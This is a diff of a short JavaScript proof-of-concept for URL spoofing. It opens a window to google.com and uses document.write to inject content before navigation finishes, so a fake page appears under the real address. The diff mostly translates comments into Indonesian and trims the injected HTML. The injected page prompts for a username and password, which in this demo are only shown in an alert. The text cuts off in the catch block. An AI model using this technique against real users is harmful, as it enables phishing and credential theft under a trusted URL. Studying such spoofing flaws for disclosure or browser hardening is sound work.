@@ -1,26 +1,18 @@
 <script>
 function spoof() {
-  // Open a new window pointing to the target (will become spoofed URL)
+  // Buka page baru pointing ke target (akan menjadi spoofed URL)
   let win = window.open("https://www.google.com/", "_blank");
-  
-  // After 50ms, inject content before navigation completes
+
+  // Setelah 50ms, injeksikan konten sebelum navigasi selesai
   setTimeout(() => {
     try {
       win.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Google</title>
-        </head>
-        <body>
-          <h1>This is not Google!</h1>
-          <button onclick="
-            let username = prompt('Enter your username');
-            let password = prompt('Enter your password');
-            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-          ">Click me</button>
-        </body>
-        </html>
+<h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
       `);
       win.document.close();
     } catch (e) {
